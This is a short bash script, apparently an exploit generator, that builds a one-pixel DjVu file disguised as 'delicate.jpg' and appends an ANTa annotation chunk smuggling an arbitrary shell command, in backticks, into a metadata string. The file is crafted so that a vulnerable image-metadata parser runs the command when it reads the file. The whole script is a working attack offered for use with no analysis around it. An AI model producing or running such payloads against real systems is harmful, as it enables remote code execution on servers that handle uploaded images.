#!/usr/bin/bash

if [  ! -x "$(command -v cjb2)" ]; then

    sudo apt-get install -y djvulibre-bin

fi

if [ ${#1} -eq 0 ];then

    exit 1

elif [ ${#1} -gt 0 ] && [ ${#1} -le 13 ];then
    
    size=4

    deltaAppend=$[ 13 - ${#1} ]

else

    num=$[ ${#1} - 13 ]
    
    residue=$[ $num % 8 ]
    
    if [ $residue -eq 0 ]; then
        
	deltaSize=$[ $num / 8 ]
    
    else
	
	deltaSize=$[ $num / 8 + 1 ]
    
    fi
    
    if [ $deltaSize -gt 9 ];then
	
	exit 1
    
    fi
    
    size=`echo "obase=16;$[ $deltaSize + 4 ]"|bc`
    
    deltaAppend=$[ (8 - $residue) % 8 ]
    
fi

append=""

for ((i=1; i<=$deltaAppend; i++));do
    append=" ""$append"
done

outputFile="delicate.jpg"

tmpFile=`mktemp /tmp/exif.temp.XXXXXX`

printf 'P1 1 1 0' > tmpFile

cjb2 tmpFile $outputFile 

printf 'ANTa\0\0\0\'$size'0"(xmp(\\\n".`'"$append""$1"' >&2`;#"' >> $outputFile

